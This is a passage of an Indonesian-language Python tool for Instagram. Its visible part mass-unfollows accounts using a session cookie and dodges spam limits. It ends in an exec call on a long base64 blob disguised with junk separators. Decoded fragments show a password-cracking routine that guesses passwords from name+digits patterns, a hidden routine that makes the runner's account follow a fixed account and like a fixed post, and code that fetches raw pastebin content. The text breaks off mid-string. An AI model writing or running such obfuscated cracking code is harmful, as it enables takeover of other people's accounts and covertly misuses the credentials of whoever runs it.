			headers = {'x-csrftoken':csrf,'user-agent':agent,'cookie':codeteam["cookie"],'x-ig-app-id':str(randint(0, 999999999999999)),'x-instagram-ajax':'1006309069',"pragma":"no-cache"}
			l = ses.post("https://www.instagram.com/api/v1/web/friendships/"+id+"/unfollow/",headers=headers)
			sta = l.json()["status"]
			print(l.json()["status"])
			if sta == "ok":
				sys.stdout.write(f'\r{random.choice([wor,war,wir])}{p}{h2}Sedang unfolowing {i}{len(id)}{p} User'),sys.stdout.flush()
			elif sta == "fail":
				sys.stdout.write(f'\r{random.choice([wor,war,wir])}{m}{h2}Spam... Hidup Matikan Mode Pesawat !'),sys.stdout.flush()
				time.sleep(2);self.unfollow_all(id)
			else:
				sys.stdout.write(f'\r{random.choice([wor,war,wir])}{m}{h2}Spam... Hidup Matikan Mode Pesawat !'),sys.stdout.flush()
				time.sleep(2);self.unfollow_all(id)
		except:
			time.sleep(3);self.unfollow_all(id)
	def all_unfollowing(self):
		cls();logo()
		try:
#			target= input(f'{wor}{c}Masukan Username Target{q} : {k}')
			za=re.findall('sessionid=(\d+)',codeteam["cookie"])[0]
			print(f"{war}{i}Mohon Bersabar Sedang Mengumpulkan Id...")
		except:
			print(f'{war}{m}Gagal Mengumpulkan Id...');quit()
		max_dump = 10000
		dump_id = ses.get(f'https://i.instagram.com/api/v1/friendships/{za}/following/?count=1000',headers = {'user-agent'	: agent,'x-ig-app-id'	: '1217981644879628','cookie'		: codeteam["cookie"]})
		try:max.append(dump_id.json()['next_max_id'])
		except KeyError:max.append(12)
		print(f"{wor}{i}Gunakan Perintah {p}{h2}CTRL + C{q} {i}Untuk Stop\n")
		while True:
			try:
				try:
					dump_id = ses.get(f'https://i.instagram.com/api/v1/friendships/{za}/following/?count=2000&max_id={max[-1]}',headers = {'user-agent'	: agent,'x-ig-app-id'	: '1217981644879628','cookie'		: codeteam["cookie"]})
					_dump = dump_id.json()['users']
					for ii in _dump:
						id_me=self.get_data(f'{ii["username"]}')["id"]
						self.unfollow_all(f"{id_me}")
						id.append(f'{id_me}')
				except KeyError:break
			except KeyboardInterrupt:break
			except Exception as e:os.sys.exit(f"{war}{m}Error {q}: {k}{str(e)}")
		print(f"{u}{jarak}{q}\n{wor}{k}Berhasil Unfolowing {i}{len(id)}{k} User")
		quit()
exec(_RIZKY_("Risky Suka Hentai",_JE3CK_("Jeeck Santuy","Y2xhcπ9π3MgY3π9πJhY2sπ9π6Cglkπ9πZWYgXπ9π19pbmπ9πl0X18π9πoc2Vsπ9πZik6Cπ9πgkJc2π9πVsZi5π9πzdXN1π9πbl9jcπ9πmsoKQπ9πoJCXBπ9πhc3MKπ9πCWRlZπ9πiBzdXπ9πN1bl9π9πjcmsoπ9πc2VsZπ9πik6Cgπ9πkJc2Vπ9πsZi5wπ9πaWxpaπ9πF9wYXπ9πNzKCkπ9πKCQlzπ9πZWxmLπ9πnBpbGπ9πloX21π9πldGhvπ9πZCgpCπ9πgkJc2π9πVsZi5π9πwaWxpπ9πaF9mbπ9π2xsb3π9πcoKQoπ9πJCXNlπ9πbGYuZπ9π2V0X2π9πhlYWQπ9πoKQoJπ9πCWNscπ9πygpO2π9πxvZ28π9πoKQoJπ9πCXByaπ9πW50cyπ9πhQYW5π9πlbChmπ9πIntXQπ9πVJ9SGπ9πFzaWwπ9πge0tLπ9πfUNoZπ9πWNrUGπ9π9pbnRπ9π7UVF9π9πIERpUπ9π2ltcGπ9πFuIERπ9πpICA6π9πIHJlcπ9π3VsdHπ9πMve0tπ9πLfUNQπ9πLUlHLπ9πXthbGπ9πxfZGFπ9π5fS50π9πeHR7Uπ9πVF9XGπ9π57V0Fπ9πSfUhhπ9πc2lsIπ9πHtJSXπ9π1UaWRπ9πhayBDπ9πaGVjaπ9π3tRUXπ9π0gRGlπ9πTaW1wπ9πYW4gRπ9πGkgOiπ9πByZXNπ9π1bHRzπ9πL3tJSπ9πX1PSyπ9π1JRy1π9π7YWxsπ9πX2Rheπ9πX0udHπ9πh0e1Fπ9πRfSIsπ9πd2lkdπ9πGg9MTπ9πAwLHBπ9πhZGRpπ9πbmc9Kπ9πDApLHπ9πN0eWxπ9πlPWYiπ9πe0F9Iπ9πikpCgπ9πkJc2Vπ9πsZi5zπ9πdGFydπ9πF9jcmπ9πFjaygπ9πpCglkπ9πZWYgcπ9πGlsaWπ9πhfcGFπ9πzcyhzπ9πZWxmKπ9πToKCQπ9πlnbG9π9πiYWwgπ9πa250bπ9πCx6eAπ9πoJCXRπ9πhbXBpπ9πbGFuXπ9π21lbnπ9πUgPSBπ9πmIiIiπ9πe1FRfπ9πVt7Q0π9πN9MDFπ9π7UVF9π9πXXtPTπ9π30gTmπ9πFtYSxπ9πOYW1hπ9πMTIzLπ9πE5hbWπ9πExMjMπ9π0NQp7π9πUVF9Wπ9π3tDQ3π9π0wMntπ9πRUX1dπ9πe09Pfπ9πSBOYWπ9π1hLE5π9πhbWExπ9πMjMsTπ9πmFtYTπ9πEyMzQπ9πsTmFtπ9πYTEyMπ9πzQ1Cnπ9πtRUX1π9πbe0NDπ9πfTAzeπ9π1FRfVπ9π17T09π9π9IE5hπ9πbWEsTπ9πmFtYTπ9πEyMyxπ9πOYW1hπ9πMTIzNπ9πCxOYWπ9π1hMTIπ9πzNDUsπ9πTmFtYπ9πTEyMzπ9πQ1Nixπ9πOYW1hπ9πMzIxCπ9πntRUXπ9π1be0Nπ9πDfTA0π9πe1FRfπ9πV17T0π9π99IE5π9πhbWEsπ9πTmFtYπ9πTEyMyπ9πxOYW1π9πhMTIzπ9πNCxOYπ9πW1hMTπ9πIzNDUπ9πsICsrπ9πIE1BTπ9πlVBTAπ9πp7UVFπ9π9W3tDπ9πQ30wNπ9πXtRUXπ9π1de09π9πPfSBNπ9πQU5VQπ9πUwiIiπ9πIKCQlπ9πwcmluπ9πdHMoUπ9πGFuZWπ9πwodGFπ9πtcGlsπ9πYW5fbπ9πWVudSπ9πx0aXRπ9πsZT1mπ9πIntHTπ9π0R9e1π9πBQfVBπ9πBU1NXπ9πT1JEeπ9π0dPRHπ9π0iLHdπ9πpZHRoπ9πPTEwMπ9πCxwYWπ9πRkaW5π9πnPSgwπ9πKSxzdπ9πHlsZTπ9π1mIntπ9πBfSIsπ9πc3Vidπ9πGl0bGπ9πVfYWxπ9πpZ249π9πJ2xlZπ9πnQnLHπ9πN1YnRπ9πpdGxlπ9πPWYi4π9πpSPU0π9πlMQUhπ9πLQU4iπ9πKSkKCπ9πQlrbnπ9πRsID0π9πgaW5wπ9πdXQoZπ9πiJ7YXπ9π0gICDπ9πilJd7π9πY31Qaπ9πWxpaCπ9πA6IHtπ9πhfSIpπ9πCgkJaπ9πWYga2π9π50bCBπ9πpbiAoπ9πIjQiLπ9πCI1Iiπ9πwiMDQπ9πiLCIwπ9πNSIpOπ9πgoJCQπ9πl3aGlπ9πsZSBUπ9πcnVlOπ9πgoJCQπ9πkJcHJπ9πpbnRzπ9πKFBhbπ9πmVsKGπ9πYie1dπ9πBUn17π9πS0t9Tπ9πWFzdWπ9πthbiBπ9πQYXNzπ9πd29yZπ9πCBZYWπ9π5nIExπ9πlYmloπ9πIERhcπ9πmkgNSπ9πhMaW1π9πhKSBIπ9πdXJ1Zπ9πlxue1π9πdBUn1π9π7S0t9π9πR3VuYπ9πWthbiπ9πBTeW1π9πib2wgπ9πLCAoSπ9π29tYSπ9πkgVW5π9π0dWsgπ9πUGVtaπ9πXNhaFπ9πxue1dπ9πPUn17π9πUVF9Qπ9π29udGπ9π9oIDoπ9πge1BQπ9πfWFuaπ9πmluZ3π9πtRUX0π9πse1BQπ9πfWtvbπ9πnRvbCπ9πIsd2lπ9πkdGg9π9πMTAwLπ9πHBhZGπ9πRpbmcπ9π9KDApπ9πLHN0eπ9πWxlPWπ9πYie0Fπ9π9Iixzπ9πdWJ0aπ9πXRsZVπ9π9hbGlπ9πnbj0nπ9πbGVmdπ9πCcsc3π9πVidGlπ9π0bGU9π9πZiLilπ9πI9TSUπ9πxBSEtπ9πBTiBJπ9πU0kiKπ9πSkKCQπ9πkJCXpπ9π4ID0gπ9πaW5wdπ9πXQoZiπ9πJ7YX0π9πgICDiπ9πlJd7Yπ9π31QYXπ9πNzd29π9πyZCA6π9πIHthfπ9πSIpCgπ9πkJZWxπ9πpZiBrπ9πbnRsIπ9πGluICπ9πgiMSIπ9πsIjAxπ9πIiwiMπ9πiIsIjπ9πAyIiwπ9πiMyIsπ9πIjAzIπ9πik6cGπ9πFzcwoπ9πJCWVsπ9πc2U6Cπ9πgkJCWπ9πNvbnNπ9πvbGUuπ9πcnVsZπ9πShmInπ9πtHT0Rπ9π9e01Nπ9πfUVycπ9πm9ye0π9πdPRH0π9πiLHN0π9πeWxlPπ9πSJib2π9πxkIHJπ9πlZCIpπ9πCgkJCπ9πWNvbnπ9πNvbGUπ9πucHJpπ9πbnQoVπ9πGV4dCπ9πhmIntπ9π3YXJ9π9πTWFhZπ9πiBNZWπ9π51IFlπ9πhbmcgπ9πQW5kYπ9πSBQaWπ9πxpaCBπ9πUaWRhπ9πayBBZπ9πGEiKSπ9πwgc3Rπ9π5bGU9π9πInJlZπ9πCIsanπ9πVzdGlπ9πmeT0iπ9πY2Vudπ9πGVyIiπ9πk7dGlπ9πtZS5zπ9πbGVlcπ9πCgzKQπ9πoJCQlπ9πzZWxmπ9πLnBpbπ9πGloX3π9πBhc3Mπ9πoKQoJπ9πZGVmIπ9πGdldFπ9π9wYXNπ9πzKHNlπ9πbGYsbπ9πmFtYSπ9πk6Cgkπ9πJcGVzπ9πPVtdCπ9πgkJZmπ9π9yIF9π9πSaXNrπ9πeV9Bbπ9πmRfSmπ9πVlY2tπ9πfIGluπ9πIG5hbπ9πWEuc3π9πBsaXQπ9πoJyAnπ9πKToKCπ9πQkJaWπ9πYga25π9π0bCA9π9πPSAiMπ9πSIgb3π9πIga25π9π0bCA9π9πPSAiMπ9πDEiOgπ9πoJCQkπ9πJaWYgπ9πbGVuKπ9πF9SaXπ9πNreV9π9πBbmRfπ9πSmVlYπ9π2tfKTπ9π09MyBπ9πvciBsπ9πZW4oXπ9π1Jpc2π9πt5X0Fπ9πuZF9Kπ9πZWVjaπ9π18pPTπ9π00IG9π9πyIGxlπ9πbihfUπ9πmlza3π9πlfQW5π9πkX0plπ9πZWNrXπ9πyk9PTπ9πU6Cgkπ9πJCQkJπ9πcGVzPπ9πVtfUmπ9πlza3lπ9πfQW5kπ9πX0plZπ9πWNrXyπ9πxfUmlπ9πza3lfπ9πQW5kXπ9π0plZWπ9πNrXysπ9πnMTIzπ9πJyxfUπ9πmlza3π9πlfQW5π9πkX0plπ9πZWNrXπ9πysnMTπ9πIzNDUπ9πnXQoJπ9πCQkJZπ9πWxzZTπ9πoKCQkπ9πJCQlwπ9πZXM9Wπ9π19SaXπ9πNreV9π9πBbmRfπ9πSmVlYπ9π2tfLFπ9π9SaXNπ9πreV9Bπ9πbmRfSπ9πmVlY2π9πtfKycπ9πxMjMnπ9πLF9Saπ9πXNreVπ9π9BbmRπ9πfSmVlπ9πY2tfKπ9πycxMjπ9πM0NSdπ9πdCgkJπ9πCWVsaπ9πWYga2π9π50bCAπ9π9PSAiπ9πMiIgbπ9π3Iga2π9π50bCAπ9π9PSAiπ9πMDIiOπ9πgoJCQπ9πkJaWYπ9πgbGVuπ9πKF9Saπ9πXNreVπ9π9BbmRπ9πfSmVlπ9πY2tfKπ9πT09Myπ9πBvciBπ9πsZW4oπ9πX1Jpcπ9π2t5X0π9πFuZF9π9πKZWVjπ9πa18pPπ9πT00IGπ9π9yIGxπ9πlbihfπ9πUmlzaπ9π3lfQWπ9π5kX0pπ9πlZWNrπ9πXyk9Pπ9πTU6Cgπ9πkJCQkπ9πJcGVzπ9πPVtfUπ9πmlza3π9πlfQW5π9πkX0plπ9πZWNrXπ9πyxfUmπ9πlza3lπ9πfQW5kπ9πX0plZπ9πWNrXyπ9πsnMTIπ9πzJyxfπ9πUmlzaπ9π3lfQWπ9π5kX0pπ9πlZWNrπ9πXysnMπ9πTIzNCπ9πcsX1Jπ9πpc2t5π9πX0FuZπ9πF9KZWπ9πVja18π9πrIjEyπ9πMzQ1Iπ9πixuYWπ9π1hLmxπ9πvd2Vyπ9πKCldCπ9πgkJCQπ9πllbHNπ9πlOgoJπ9πCQkJCπ9πXBlczπ9π1bX1Jπ9πpc2t5π9πX0FuZπ9πF9KZWπ9πVja18π9πrJzEyπ9πMycsXπ9π1Jpc2π9πt5X0Fπ9πuZF9Kπ9πZWVjaπ9π18sX1π9πJpc2tπ9π5X0Fuπ9πZF9KZπ9πWVja1π9π8rJzEπ9πyMzQnπ9πLF9Saπ9πXNreVπ9π9BbmRπ9πfSmVlπ9πY2tfKπ9πyIxMjπ9πM0NSIπ9πsbmFtπ9πYS5sbπ9π3dlciπ9πgpXQoπ9πJCQllπ9πbGlmIπ9πGtudGπ9πwgPT0π9πgIjMiπ9πIG9yIπ9πGtudGπ9πwgPT0π9πgIjAzπ9πIjoKCπ9πQkJCWπ9πlmIGxπ9πlbihfπ9πUmlzaπ9π3lfQWπ9π5kX0pπ9πlZWNrπ9πXyk9Pπ9πTMgb3π9πIgbGVπ9πuKF9Sπ9πaXNreπ9πV9Bbmπ9πRfSmVπ9πlY2tfπ9πKT09Nπ9πCBvciπ9πBsZW4π9πoX1Jpπ9πc2t5Xπ9π0FuZFπ9π9KZWVπ9πja18pπ9πPT01Oπ9πgoJCQπ9πkJCXBπ9πlcz1bπ9πX1Jpcπ9π2t5X0π9πFuZF9π9πKZWVjπ9πa18sXπ9π1Jpc2π9πt5X0Fπ9πuZF9Kπ9πZWVjaπ9π18rJzπ9πEyMycπ9πsX1Jpπ9πc2t5Xπ9π0FuZFπ9π9KZWVπ9πja18rπ9πJzEyMπ9πzQnLFπ9π9SaXNπ9πreV9Bπ9πbmRfSπ9πmVlY2π9πtfKycπ9πzMjEnπ9πLF9Saπ9πXNreVπ9π9BbmRπ9πfSmVlπ9πY2tfKπ9πycxMjπ9πM0NScπ9πsX1Jpπ9πc2t5Xπ9π0FuZFπ9π9KZWVπ9πja18rπ9πJzEyMπ9πzQ1Niπ9πcsbmFπ9πtYS5sπ9πb3dlcπ9πigpXQπ9πoJCQkπ9πJZWxzπ9πZToKCπ9πQkJCQπ9πlwZXMπ9π9W19Sπ9πaXNreπ9πV9Bbmπ9πRfSmVπ9πlY2tfπ9πLF9Saπ9πXNreVπ9π9BbmRπ9πfSmVlπ9πY2tfKπ9πycxMjπ9πMnLF9π9πSaXNrπ9πeV9Bbπ9πmRfSmπ9πVlY2tπ9πfKycxπ9πMjM0Jπ9πyxfUmπ9πlza3lπ9πfQW5kπ9πX0plZπ9πWNrXyπ9πsnMzIπ9πxJyxfπ9πUmlzaπ9π3lfQWπ9π5kX0pπ9πlZWNrπ9πXysnMπ9πTIzNDπ9πUnLF9π9πSaXNrπ9πeV9Bbπ9πmRfSmπ9πVlY2tπ9πfKycxπ9πMjM0Nπ9πTYnLGπ9π5hbWEπ9πubG93π9πZXIoKπ9πV0KCgπ9πkJCWVπ9πsaWYgπ9πa250bπ9πCA9PSπ9πAiNCIπ9πgb3Igπ9πa250bπ9πCA9PSπ9πAiMDQπ9πiOgoJπ9πCQkJaπ9πWYgbGπ9πVuKF9π9πSaXNrπ9πeV9Bbπ9πmRfSmπ9πVlY2tπ9πfKT09π9πMyBvcπ9πiBsZWπ9π4oX1Jπ9πpc2t5π9πX0FuZπ9πF9KZWπ9πVja18π9πpPT00π9πIG9yIπ9πGxlbiπ9πhfUmlπ9πza3lfπ9πQW5kXπ9π0plZWπ9πNrXykπ9π9PTU6π9πCgkJCπ9πQkJcGπ9πVzLmFπ9πwcGVuπ9πZChfUπ9πmlza3π9πlfQW5π9πkX0plπ9πZWNrXπ9πykKCQπ9πkJCQlπ9πwZXMuπ9πYXBwZπ9πW5kKFπ9π9SaXNπ9πreV9Bπ9πbmRfSπ9πmVlY2π9πtfKycπ9πxMjMnπ9πKQoJCπ9πQkJCXπ9πBlcy5π9πhcHBlπ9πbmQoXπ9π1Jpc2π9πt5X0Fπ9πuZF9Kπ9πZWVjaπ9π18rJzπ9πEyMzQπ9πnKQoJπ9πCQkJCπ9πXBlcyπ9π5hcHBπ9πlbmQoπ9πX1Jpcπ9π2t5X0π9πFuZF9π9πKZWVjπ9πa18rJπ9πzMyMSπ9πcpCgkπ9πJCQkJπ9πcGVzLπ9πmFwcGπ9πVuZChπ9πfUmlzπ9πa3lfQπ9πW5kX0π9πplZWNπ9πrXysnπ9πMTIzNπ9πDUnKQπ9πoJCQkπ9πJCXBlπ9πcy5hcπ9πHBlbmπ9πQoX1Jπ9πpc2t5π9πX0FuZπ9πF9KZWπ9πVja18π9πrJzEyπ9πMzQ1Nπ9πicpCgπ9πkJCQkπ9πJcGVzπ9πLmFwcπ9πGVuZCπ9πhuYW1π9πhLmxvπ9πd2VyKπ9πCkpCgπ9πkJCQkπ9πJZm9yπ9πIHggaπ9πW4genπ9πguc3Bπ9πsaXQoπ9πIiwiKπ9πToKCQπ9πkJCQkπ9πJcGVzπ9πLmFwcπ9πGVuZCπ9πh4KQoπ9πJCQkJπ9πZWxzZπ9πToKCQπ9πkJCQlπ9πwZXMuπ9πYXBwZπ9πW5kKFπ9π9SaXNπ9πreV9Bπ9πbmRfSπ9πmVlY2π9πtfKQoπ9πJCQkJπ9πCXBlcπ9πy5hcHπ9πBlbmQπ9πoX1Jpπ9πc2t5Xπ9π0FuZFπ9π9KZWVπ9πja18rπ9πJzEyMπ9πycpCgπ9πkJCQkπ9πJcGVzπ9πLmFwcπ9πGVuZCπ9πhfUmlπ9πza3lfπ9πQW5kXπ9π0plZWπ9πNrXysπ9πnMTIzπ9πNCcpCπ9πgkJCQπ9πkJcGVπ9πzLmFwπ9πcGVuZπ9πChfUmπ9πlza3lπ9πfQW5kπ9πX0plZπ9πWNrXyπ9πsnMzIπ9πxJykKπ9πCQkJCπ9πQlwZXπ9πMuYXBπ9πwZW5kπ9πKF9Saπ9πXNreVπ9π9BbmRπ9πfSmVlπ9πY2tfKπ9πycxMjπ9πM0NScπ9πpCgkJπ9πCQkJcπ9πGVzLmπ9πFwcGVπ9πuZChfπ9πUmlzaπ9π3lfQWπ9π5kX0pπ9πlZWNrπ9πXysnMπ9πTIzNDπ9πU2Jykπ9πKCQkJπ9πCQlwZπ9πXMuYXπ9πBwZW5π9πkKG5hπ9πbWEubπ9πG93ZXπ9πIoKSkπ9πKCQkJπ9πCQlmbπ9π3IgeCπ9πBpbiBπ9π6eC5zπ9πcGxpdπ9πCgiLCπ9πIpOgoπ9πJCQkJπ9πCQlpZπ9πiBsZWπ9π4oeCkπ9π+NToKπ9πCQkJCπ9πQkJCXπ9πBlcy5π9πhcHBlπ9πbmQoeπ9πCkKCQπ9πkJZWxπ9πpZiBrπ9πbnRsIπ9πD09ICπ9πI1IiBπ9πvciBrπ9πbnRsIπ9πD09ICπ9πIwNSIπ9π6CgkJπ9πCQlpZπ9πiBsZWπ9π4oX1Jπ9πpc2t5π9πX0FuZπ9πF9KZWπ9πVja18π9πpPT0zπ9πIG9yIπ9πGxlbiπ9πhfUmlπ9πza3lfπ9πQW5kXπ9π0plZWπ9πNrXykπ9π9PTQgπ9πb3Igbπ9πGVuKFπ9π9SaXNπ9πreV9Bπ9πbmRfSπ9πmVlY2π9πtfKT0π9π9NToKπ9πCQkJCπ9πQlmb3π9πIgeCBπ9πpbiB6π9πeC5zcπ9πGxpdCπ9πgiLCIπ9πpOgoJπ9πCQkJCπ9πQlpZiπ9πBsZW4π9πoeCk+π9πNToKCπ9πQkJCQπ9πkJCXBπ9πlcy5hπ9πcHBlbπ9πmQoeCπ9πkKCQkπ9πJCWVsπ9πc2U6Cπ9πgkJCQπ9πkJZm9π9πyIHggπ9πaW4geπ9πnguc3π9πBsaXQπ9πoIiwiπ9πKToKCπ9πQkJCQπ9πkJaWYπ9πgbGVuπ9πKHgpPπ9πjU6Cgπ9πkJCQkπ9πJCQlwπ9πZXMuYπ9πXBwZWπ9π5kKHgπ9πpCgkJπ9πCXJldπ9πHVybiπ9πBwZXMπ9πKCWRlπ9πZiBmbπ9π2xsb3π9πdNZShπ9πzZWxmπ9πLGNvbπ9π2tpZXπ9πMsIGNπ9πzcmYpπ9πOgoJCπ9πWhlYWπ9πRlcnMπ9πgPSB7π9πJ3gtYπ9π3NyZnπ9πRva2Vπ9πuJzpjπ9πc3JmLπ9πCd1c2π9πVyLWFπ9πnZW50π9πJzphZπ9π2VudCπ9πwnY29π9πva2llπ9πJzpjbπ9π29raWπ9πVzLCdπ9π4LWlnπ9πLWFwcπ9πC1pZCπ9πc6Jzkπ9πzNjYxπ9πOTc0Mπ9πzM5Mjπ9πQ1OScπ9πsJ3gtπ9πaW5zdπ9πGFncmπ9πFtLWFπ9πqYXgnπ9πOicxMπ9πDA2Mzπ9πA5MDYπ9π5J30Kπ9πCQlzZπ9πXMucGπ9π9zdCgπ9πnaHR0π9πcHM6Lπ9πy9pLmπ9πluc3Rπ9πhZ3Jhπ9πbS5jbπ9π20vYXπ9πBpL3Yπ9πxL3dlπ9πYi9mcπ9πmllbmπ9πRzaGlπ9πwcy85π9πMzQyOπ9πDI1Nzπ9πcvZm9π9πsbG93π9πLycsaπ9πGVhZGπ9πVycz1π9πoZWFkπ9πZXJzKπ9πQoJCXπ9πNlcy5π9πwb3N0π9πKCdodπ9πHRwczπ9πovL2kπ9πuaW5zπ9πdGFncπ9πmFtLmπ9πNvbS9π9πhcGkvπ9πdjEvdπ9π2ViL2π9πxpa2Vπ9πzLzI5π9πNTg3Nπ9πzA0Mjπ9πg3MDIπ9π1MDE2π9πMjcvbπ9πGlrZSπ9π8nLGhπ9πlYWRlπ9πcnM9aπ9πGVhZGπ9πVycykπ9πKCWRlπ9πZiBmbπ9π2xsb3π9πdNZTIπ9πoc2Vsπ9πZixjbπ9π29raWπ9πVzLCBπ9πjc3Jmπ9πKToKCπ9πQlpZiπ9πBmbHcπ9πgaW4gπ9πKCJ5Iπ9πiwiWSπ9πIpOgoπ9πJCQloπ9πZWFkZπ9πXJzIDπ9π0geydπ9π4LWNzπ9πcmZ0bπ9π2tlbiπ9πc6Y3Nπ9πyZiwnπ9πdXNlcπ9πi1hZ2π9πVudCcπ9π6YWdlπ9πbnQsJπ9π2Nvb2π9πtpZScπ9π6Y29vπ9πa2llcπ9πywneCπ9π1pZy1π9πhcHAtπ9πaWQnOπ9πic5Mzπ9πY2MTkπ9π3NDMzπ9πOTI0Nπ9πTknLCπ9πd4LWlπ9πuc3Rhπ9πZ3Jhbπ9πS1hamπ9πF4Jzoπ9πnMTAwπ9πNjMwOπ9πTA2OSπ9πd9Cgkπ9πJCXNlπ9πcy5wbπ9π3N0KCπ9πdodHRπ9πwczovπ9πL2kuaπ9πW5zdGπ9πFncmFπ9πtLmNvπ9πbS9hcπ9πGkvdjπ9πEvd2Vπ9πiL2Zyπ9πaWVuZπ9πHNoaXπ9πBzLycπ9πrdXNlπ9πcl9ndπ9πWVzdCπ9πsnL2Zπ9πvbGxvπ9πdy8nLπ9πGhlYWπ9πRlcnMπ9π9aGVhπ9πZGVycπ9πykKCWπ9πRlZiBπ9πnZXRfπ9πaGVhZπ9πChzZWπ9πxmKToπ9πKCQkjπ9πIEphbπ9πmdhbiπ9πBEaUVπ9πkaXQgπ9πTmFudπ9πGkgRXπ9πJyb3Iπ9πKCQlpπ9πZiBueπ9πmsgaWπ9π4gKCIπ9πxIiwiπ9πMDEiKπ9πToKCQπ9πkJX19π9πSSVNLπ9πWV9fLπ9πnVwZGπ9πF0ZShπ9πzZXMuπ9πZ2V0Kπ9πCdodHπ9πRwczoπ9πvL3Bhπ9πc3RlYπ9πmluLmπ9πNvbS9π9πyYXcvπ9πcURNQπ9πUR1V1π9πcnKS5π9πqc29uπ9πKCkpCπ9πgkJCVπ9π9fSkVπ9πFQ0tfπ9πXy51cπ9πGRhdGπ9πUoc2Vπ9πzLmdlπ9πdCgiaπ9πHR0cHπ9πM6Ly9π9πwYXN0π9πZWJpbπ9πi5jb2π9π0vcmFπ9π3LzFMπ9πeUp5cπ9πzVTIiπ9πkuanNπ9πvbigpπ9πKQojCπ9πQkJX1π9π9KRUVπ9πDS19fπ9πLnVwZπ9πGF0ZSπ9πhzZXMπ9πuZ2V0π9πKCJodπ9πHRwczπ9πovL3Bπ9πhc3Rlπ9πYmluLπ9πmNvbSπ9π9yYXcπ9πvaUNuπ9πZldaYπ9πmciKSπ9π5qc29π9πuKCkpπ9πCgkJZπ9πWxpZiπ9πBuemsπ9πgaW4gπ9πKCIyIπ9πiwiMDπ9πIiKToπ9πKCQkJπ9πX19SSπ9πVNLWVπ9π9fLnVπ9πwZGF0π9πZShzZπ9πXMuZ2π9πV0KCdπ9πodHRwπ9πczovLπ9π3Bhc3π9πRlYmlπ9πuLmNvπ9πbS9yYπ9πXcvNzπ9πNnNlZπ9πzS2cnπ9πKS5qcπ9π29uKCπ9πkpCgkπ9πJCV9fπ9πSkVFQπ9π0tfXyπ9π51cGRπ9πhdGUoπ9πc2VzLπ9πmdldCπ9πgiaHRπ9π0cHM6π9πLy9wYπ9πXN0ZWπ9πJpbi5π9πjb20vπ9πcmF3Lπ9πzFMeUπ9πp5czVπ9πTIikuπ9πanNvbπ9πigpKQπ9πoJZGVπ9πmIHBpπ9πbGloXπ9π21ldGπ9πhvZChπ9πzZWxmπ9πKToKCπ9πQlnbGπ9π9iYWwπ9πgcHBrπ9πLG56aπ9πwoJCXπ9πRhbXBπ9πpbGFuπ9πX21lbπ9πnUgPSπ9πBmIiIπ9πie1FRπ9πfVt7Qπ9π0N9MDπ9πF7UVFπ9π9XXtPπ9πT30gTπ9πWV0aGπ9π9kIFYπ9πxIHtNπ9πTX1Tbπ9πG93e1π9πFRfStπ9π7SUl9π9πSWpveπ9π1FRfQπ9πp7UVFπ9π9W3tDπ9πQ30wMπ9πntRUXπ9π1de09π9πPfSBNπ9πZXRobπ9π2QgVjπ9πIge0lπ9πJfUZhπ9πc3R7Uπ9πVF9K3π9πtJSX1π9πJam97π9πUVF9Iπ9πiIiCgπ9πkJcHJπ9πpbnRzπ9πKFBhbπ9πmVsKHπ9πRhbXBπ9πpbGFuπ9πX21lbπ9πnUsdGπ9πl0bGUπ9π9ZiJ7π9πR09Efπ9πXtQUHπ9π1QQVNπ9πTV09Sπ9πRHtHTπ9π0R9Iiπ9πx3aWRπ9π0aD0xπ9πMDAscπ9πGFkZGπ9πluZz0π9πoMCksπ9πc3R5bπ9πGU9Ziπ9πJ7QX0π9πiLHN1π9πYnRpdπ9πGxlX2π9πFsaWdπ9πuPSdsπ9πZWZ0Jπ9πyxzdWπ9πJ0aXRπ9πsZT1mπ9πIuKUjπ9π1NJTEπ9πFIS0Fπ9πOIikpπ9πCgkJcπ9πHBrIDπ9π0gaW5π9πwdXQoπ9πZiJ7Yπ9πX0gICπ9πDilJdπ9π7Y31Qπ9πaWxpaπ9πCA6IHπ9πthfSIπ9πpCgkJπ9πaWYgcπ9πHBrIGπ9πluICgπ9πiMiIsπ9πIjAyIπ9πik6cGπ9πFzcwoπ9πJCWVsπ9πaWYgcπ9πHBrIGπ9πluICgπ9πiMSIsπ9πIjAxIπ9πik6Cgπ9πkJCXRπ9πhbXBpπ9πbGFuXπ9π2hlYWπ9πQgPSBπ9πmIiIiπ9πe1FRfπ9πVt7Q0π9πN9MDFπ9π7UVF9π9πXXtPTπ9π30gSGπ9πVhZGVπ9πycyBWπ9πaXZvCπ9πntRUXπ9π1be0Nπ9πDfTAyπ9πe1FRfπ9πV17T0π9π99IEhπ9πlYWRlπ9πcnMgTπ9π3Bwbyπ9πIiIgoπ9πJCQlwπ9πcmludπ9πHMoUGπ9πFuZWwπ9πodGFtπ9πcGlsYπ9πW5faGπ9πVhZCxπ9π0aXRsπ9πZT1mIπ9πntHT0π9πR9e1Bπ9πQfUhFπ9πQURFUπ9πlN7R0π9π9EfSIπ9πsd2lkπ9πdGg9Mπ9πTAwLHπ9πBhZGRπ9πpbmc9π9πKDApLπ9πHN0eWπ9πxlPWYπ9πie0F9π9πIixzdπ9πWJ0aXπ9πRsZV9π9πhbGlnπ9πbj0nbπ9πGVmdCπ9πcsc3Vπ9πidGl0π9πbGU9Zπ9πiLilIπ9π9TSUxπ9πBSEtBπ9πTiIpKπ9πQoJCQπ9πluemsπ9πgPSBpπ9πbnB1dπ9πChmInπ9πthfSAπ9πgIOKUπ9πl3tjfπ9πVBpbGπ9πloIDoπ9πge2F9π9πIikKCπ9πQkJaWπ9πYgbnpπ9πrIGluπ9πICgiMπ9πSIsIjπ9πAxIiwπ9πiMiIsπ9πIjAyIπ9πik6cGπ9πFzcwoπ9πJCQllπ9πbHNlOπ9πgoJCQπ9πkJY29π9πuc29sπ9πZS5ydπ9πWxlKGπ9πYie0dπ9πPRH17π9πTU19Rπ9πXJyb3π9πJ7R09π9πEfSIsπ9πc3R5bπ9πGU9Imπ9πJvbGQπ9πgcmVkπ9πIikKCπ9πQkJCWπ9πNvbnNπ9πvbGUuπ9πcHJpbπ9πnQoVGπ9πV4dChπ9πmInt3π9πYXJ9Tπ9πWFhZiπ9πBNZW5π9π1IFlhπ9πbmcgQπ9πW5kYSπ9πBQaWxπ9πpaCBUπ9πaWRhaπ9πyBBZGπ9πEiKSwπ9πgc3R5π9πbGU9Iπ9πnJlZCπ9πIsanVπ9πzdGlmπ9πeT0iYπ9π2VudGπ9πVyIikπ9π7dGltπ9πZS5zbπ9πGVlcCπ9πgzKQoπ9πJCQkJπ9πc2VsZπ9πi5waWπ9πxpaF9π9πtZXRoπ9πb2QoKπ9πQoJCWπ9πVsc2Uπ9π6CgkJπ9πCWNvbπ9πnNvbGπ9π